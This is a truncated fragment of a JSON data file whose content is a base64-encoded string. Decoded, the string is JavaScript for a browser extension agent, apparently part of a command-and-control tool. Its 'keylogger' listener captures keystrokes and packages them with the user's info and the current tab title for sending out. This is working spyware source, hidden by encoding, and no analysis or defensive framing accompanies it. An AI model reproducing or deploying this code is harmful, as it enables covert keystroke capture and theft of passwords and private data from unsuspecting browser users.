odW5lc2NhcGUoZW5jb2RlVVJJQ29tcG9uZW50KGZpbmFsKSkpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9hZHNbal0gPSB7fTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIG91dC5wdXNoKG1zZyk7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9ICAKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KfTsKCi8vIExpc3RlbmVyIGZvciBrZXlsb2dnZXIKY2hyb21lLnJ1bnRpbWUub25Db25uZWN0LmFkZExpc3RlbmVyKGZ1bmN0aW9uKHBvcnQpIHsKICAgIC8vY29uc29sZS5sb2coIlJlY2VpdmVkIG5ldyBydW50aW1lIGNvbm5lY3Rpb24gZnJvbSBwb3J0ICIgKyBwb3J0Lm5hbWUpOwogICAgdmFyIHJlc3VsdCA9IHBvcnQubmFtZS5sb2NhbGVDb21wYXJlKCJrZXlsb2dnZXIiKTsKICAgIGlmIChyZXN1bHQgPT09IDApIHsKICAgICAgICBwb3J0Lm9uTWVzc2FnZS5hZGRMaXN0ZW5lcihmdW5jdGlvbihtc2cpIHsKICAgICAgICAgICAgbGV0IGttc2cgPSB7CiAgICAgICAgICAgICAgICAidGFza19pZCI6IGxvZ2dlciwKICAgICAgICAgICAgICAgICJ1c2VyIjogYXBmZWxsLnVzZXJpbmZvLAogICAgICAgICAgICAgICAgIndpbmRvd190aXRsZSI6IHBvcnQuTWVzc2FnZVNlbmRlci50YWJzLlRhYi50aXRsZSwKICAgICAgICAgICAgICAgICJrZXlzdHJva2VzIjogSlNPTi5zdHJpbmdpZnkobXNnKQogICAgICAgICAgICB9OwogICAgICAgICAgICAvL2NvbnNvbGUubG9nKCJTZW5kaW5nIGtleXN0cm9rZXMgIiArIEpTT04uc3RyaW5naWZ5KGttc2cpKTsKICAgICAgICAgICAgb3V0LnB1c2goa21zZyk7CiAgICAgICAgfSk7CiAgICB9Cn0pOw=="
            }
          ]
        }
      ]
    }
  ]
}
